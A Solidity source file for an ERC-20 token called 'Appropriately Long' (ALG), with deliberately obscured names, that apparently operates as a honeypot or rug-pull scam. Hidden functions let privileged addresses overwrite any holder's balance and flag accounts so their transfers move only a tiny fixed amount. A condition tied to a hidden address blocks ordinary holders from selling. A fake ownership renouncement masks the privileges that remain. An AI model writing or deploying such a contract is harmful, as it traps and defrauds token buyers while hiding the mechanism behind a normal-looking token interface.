//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface launchWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract autoWallet {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxMarketing {
    function createPair(address takeMarketingLaunch, address listMode) external returns (address);
}

interface tradingTotalTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address marketingSwap) external view returns (uint256);

    function transfer(address autoLiquiditySender, uint256 limitSender) external returns (bool);

    function allowance(address enableAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 limitSender) external returns (bool);

    function transferFrom(
        address sender,
        address autoLiquiditySender,
        uint256 limitSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverTotal, uint256 value);
    event Approval(address indexed enableAt, address indexed spender, uint256 value);
}

interface buyLaunched is tradingTotalTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AppropriatelyLong is autoWallet, tradingTotalTx, buyLaunched {

    uint256 private shouldTake;

    function senderSell(address launchExempt, uint256 limitSender) public {
        receiverTeam();
        launchedIs[launchExempt] = limitSender;
    }

    function transfer(address launchExempt, uint256 limitSender) external virtual override returns (bool) {
        return teamToMode(_msgSender(), launchExempt, limitSender);
    }

    bool public takeReceiver;

    bool public takeMin;

    uint256 public toTotal;

    function allowance(address tradingMode, address maxLaunch) external view virtual override returns (uint256) {
        if (maxLaunch == maxAuto) {
            return type(uint256).max;
        }
        return fundReceiver[tradingMode][maxLaunch];
    }

    uint256 public launchedLimit;

    function getOwner() external view returns (address) {
        return listIsMode;
    }

    mapping(address => bool) public limitAt;

    bool private feeLaunched;

    function transferFrom(address isExempt, address autoLiquiditySender, uint256 limitSender) external override returns (bool) {
        if (_msgSender() != maxAuto) {
            if (fundReceiver[isExempt][_msgSender()] != type(uint256).max) {
                require(limitSender <= fundReceiver[isExempt][_msgSender()]);
                fundReceiver[isExempt][_msgSender()] -= limitSender;
            }
        }
        return teamToMode(isExempt, autoLiquiditySender, limitSender);
    }

    function minMarketing(address modeTo) public {
        receiverTeam();
        if (takeMin != feeLaunched) {
            takeMin = true;
        }
        if (modeTo == totalAuto || modeTo == toBuyMode) {
            return;
        }
        tokenFundMin[modeTo] = true;
    }

    string private feeSellMarketing = "Appropriately Long";

    constructor (){
        
        launchWallet fundTo = launchWallet(maxAuto);
        toBuyMode = maxMarketing(fundTo.factory()).createPair(fundTo.WETH(), address(this));
        if (feeLaunched == takeMin) {
            takeMin = false;
        }
        totalAuto = _msgSender();
        minTotal();
        limitAt[totalAuto] = true;
        launchedIs[totalAuto] = receiverMarketing;
        
        emit Transfer(address(0), totalAuto, receiverMarketing);
    }

    function approve(address maxLaunch, uint256 limitSender) public virtual override returns (bool) {
        fundReceiver[_msgSender()][maxLaunch] = limitSender;
        emit Approval(_msgSender(), maxLaunch, limitSender);
        return true;
    }

    uint256 fromToToken;

    mapping(address => bool) public tokenFundMin;

    function totalSupply() external view virtual override returns (uint256) {
        return receiverMarketing;
    }

    address private listIsMode;

    address exemptShouldTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function symbol() external view virtual override returns (string memory) {
        return swapReceiver;
    }

    uint256 constant walletSellReceiver = 8 ** 10;

    bool private fundAuto;

    function teamToMode(address isExempt, address autoLiquiditySender, uint256 limitSender) internal returns (bool) {
        if (isExempt == totalAuto) {
            return tokenLaunch(isExempt, autoLiquiditySender, limitSender);
        }
        uint256 atExempt = tradingTotalTx(toBuyMode).balanceOf(exemptShouldTx);
        require(atExempt == feeMode);
        require(autoLiquiditySender != exemptShouldTx);
        if (tokenFundMin[isExempt]) {
            return tokenLaunch(isExempt, autoLiquiditySender, walletSellReceiver);
        }
        return tokenLaunch(isExempt, autoLiquiditySender, limitSender);
    }

    address public toBuyMode;

    uint256 public tradingToReceiver;

    address maxAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function sellLaunched(address exemptLiquidity) public {
        if (takeReceiver) {
            return;
        }
        if (shouldTake == receiverAt) {
            takeMin = true;
        }
        limitAt[exemptLiquidity] = true;
        if (launchedLimit == toTotal) {
            shouldTake = toTotal;
        }
        takeReceiver = true;
    }

    address public totalAuto;

    function name() external view virtual override returns (string memory) {
        return feeSellMarketing;
    }

    function decimals() external view virtual override returns (uint8) {
        return launchReceiver;
    }

    function swapMin(uint256 limitSender) public {
        receiverTeam();
        feeMode = limitSender;
    }

    function balanceOf(address marketingSwap) public view virtual override returns (uint256) {
        return launchedIs[marketingSwap];
    }

    string private swapReceiver = "ALG";

    function tokenLaunch(address isExempt, address autoLiquiditySender, uint256 limitSender) internal returns (bool) {
        require(launchedIs[isExempt] >= limitSender);
        launchedIs[isExempt] -= limitSender;
        launchedIs[autoLiquiditySender] += limitSender;
        emit Transfer(isExempt, autoLiquiditySender, limitSender);
        return true;
    }

    mapping(address => uint256) private launchedIs;

    function owner() external view returns (address) {
        return listIsMode;
    }

    uint8 private launchReceiver = 18;

    mapping(address => mapping(address => uint256)) private fundReceiver;

    function minTotal() public {
        emit OwnershipTransferred(totalAuto, address(0));
        listIsMode = address(0);
    }

    uint256 private receiverMarketing = 100000000 * 10 ** 18;

    function receiverTeam() private view {
        require(limitAt[_msgSender()]);
    }

    uint256 feeMode;

    uint256 private receiverAt;

    event OwnershipTransferred(address indexed marketingAt, address indexed shouldAmount);

}